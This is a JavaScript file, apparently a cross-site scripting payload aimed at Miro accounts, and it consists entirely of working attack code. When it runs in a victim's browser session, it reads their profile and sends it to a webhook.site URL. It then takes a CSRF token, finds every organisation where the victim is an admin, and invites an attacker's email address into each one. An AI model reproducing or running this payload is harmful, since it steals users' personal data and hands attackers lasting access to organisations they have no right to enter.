(() => {
	fetch("https://miro.com/api/v1/profile/", {
		method: "GET",
		credentials: "include"
	})
		.then(res => res.json())
		.then(profileData => {
			const {
				achievements,
				subscriptions,
				toolbarPlugins,
				interests,
				betaFeatures,
				...slimProfileData
			} = profileData;
			const img = new Image();
			img.src = "https://webhook.site/81dfa662-c0be-426b-8512-70579868beee?leak=" +
				encodeURIComponent(JSON.stringify(slimProfileData));
		})
		.catch(err => console.error("Profile fetch failed or blocked:", err));
})();

const hackerMail = "graylen.sitiveni@malldrops.com";

async function getCsrf() {
  console.log("Fetching CSRF token...");
  const res = await fetch("https://miro.com/api/v1/csrf", {
    method: "POST",
    credentials: "include",
  });
  const json = await res.json();
  console.log("Received CSRF token:", json.token);
  return json.token;
}

async function getOrgAdmin() {
  console.log("Fetching organizations with ADMIN role...");
  const res = await fetch("https://miro.com/api/v1/accounts?fields=id%2Crole", {
    method: "GET",
    credentials: "include",
  });

  const json = await res.json();
  console.log("Response from accounts API:", json);

  if (!Array.isArray(json)) {
    console.error("Unexpected API response — expected an array.");
    return [];
  }

  const orgIds = [];
  for (const elem of json) {
    if (elem.role && elem.role.toUpperCase() === "ADMIN" && elem.id) {
      orgIds.push(elem.id);
      console.log(`Found ADMIN role with ID: ${elem.id}`);
    }
  }

  if (orgIds.length === 0) {
    console.log("No organizations with ADMIN role found.");
  }
  return orgIds;
}



async function invite(orgId, csrfToken) {
  console.log(`Sending invite to ${hackerMail} on org ${orgId}...`);
  const data = {
    emails: [hackerMail],
    channel: "EMAIL",
    membersFlowContext: {
      [hackerMail]: {
        entryPoint: "settings",
        type: "invite",
        feature: "email",
      },
    },
  };

  const res = await fetch(`https://miro.com/api/v1/accounts/${orgId}/invite`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-CSRF-TOKEN": csrfToken,
    },
    credentials: "include",
    body: JSON.stringify(data),
  });

  if (res.ok) {
    console.log(`Invite sent successfully for org ${orgId}`);
  } else {
    console.log(`Failed to send invite for org ${orgId}`);
  }
  return res.ok;
}

// Immediately invoke async function on script load
(async () => {
  console.log("Script loaded. Starting workflow...");
  try {
    const csrfToken = await getCsrf();
    const orgIds = await getOrgAdmin();

    for (const orgId of orgIds) {
      await invite(orgId, csrfToken);
    }

    console.log("Workflow finished.");
  } catch (err) {
    console.error("Error during workflow:", err);
  }
})();

